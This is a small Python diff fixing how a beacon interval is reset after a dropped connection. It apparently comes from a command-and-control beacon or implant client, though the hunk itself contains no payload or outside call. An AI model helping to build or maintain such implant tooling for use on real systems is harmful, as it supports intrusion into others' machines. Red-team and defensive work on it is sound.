@@ -398,8 +398,10 @@ def main ():
         except ConnectionResetError:
             if BEACON_INTERVAL_MEM is not None:
                 BEACON_INTERVAL_SETTING = BEACON_INTERVAL_MEM
+            elif BEACON_INTERVAL_HDD is not None:
+                BEACON_INTERVAL_SETTING = BEACON_INTERVAL_HDD
             else:
-                BEACON_INTERVAL_SETTING - BEACON_INTERVAL_HDD
+                BEACON_INTERVAL_SETTING = BEACON_INTERVAL_DEFAULT
             if VERBOSE:
                 print_fail("Remote end terminated the connection")
                 print_fail("Error on Line:{}".format(exc_info()[-1].tb_lineno))
